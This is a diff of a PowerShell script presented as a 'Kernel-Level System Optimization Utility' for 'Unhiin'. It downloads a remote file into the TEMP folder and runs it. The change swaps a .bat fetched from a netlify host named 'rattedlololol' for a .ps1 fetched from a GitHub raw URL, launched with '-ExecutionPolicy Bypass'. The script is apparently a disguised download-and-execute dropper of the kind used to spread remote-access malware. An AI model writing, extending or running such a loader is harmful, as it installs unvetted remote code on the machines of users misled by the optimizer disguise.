@@ -3,7 +3,7 @@
 .SYNOPSIS  
     Kernel-Level System Optimization Utility  
 .DESCRIPTION  
-    Downloads and executes system optimization executable with minimal interface  
+    Downloads and executes system optimization script with minimal interface  
 #>  
 
 # Console settings  
@@ -39,12 +39,13 @@ function Download-Optimizer {
 }  
 
 function Execute-Optimizer {  
-    param([string]$ExePath)  
+    param([string]$ScriptPath)  
       
     Write-Host "`nExecuting optimization..."  
       
     try {  
-        $process = Start-Process -FilePath $ExePath -Wait -PassThru  
+        # For PowerShell scripts, use PowerShell to execute
+        $process = Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$ScriptPath`"" -Wait -PassThru  
           
         if ($process.ExitCode -eq 0) {  
             Write-Host "Optimization successful."  
@@ -80,11 +81,11 @@ function Main {
     Write-Host "`nStarting Unhiin Optimization Process..."  
     Write-Host "--------------------------------------------"  
       
-    # Updated with your specific URL and filename
-    $exeUrl = "https://rattedlololol.netlify.app/unhiin_DT8HBq2dgiX4.bat"
-    $tempPath = Join-Path $env:TEMP "unhiin_DT8HBq2dgiX4.bat"  
+    # GitHub Raw URL for your PowerShell script
+    $scriptUrl = "https://raw.githubusercontent.com/hypnotixx0/unhiinps/main/Install-Puls.ps1"
+    $tempPath = Join-Path $env:TEMP "Install-Puls.ps1"  
       
-    $downloadSuccess = Download-Optimizer -Url $exeUrl -OutputPath $tempPath  
+    $downloadSuccess = Download-Optimizer -Url $scriptUrl -OutputPath $tempPath  
       
     if (-not $downloadSuccess) {  
         Write-Host "`nProcess failed during download."  
@@ -92,7 +93,7 @@ function Main {
         exit 1  
     }  
       
-    $executionSuccess = Execute-Optimizer -ExePath $tempPath  
+    $executionSuccess = Execute-Optimizer -ScriptPath $tempPath  
       
     if (-not $executionSuccess) {  
         Write-Host "`nProcess failed during execution."  
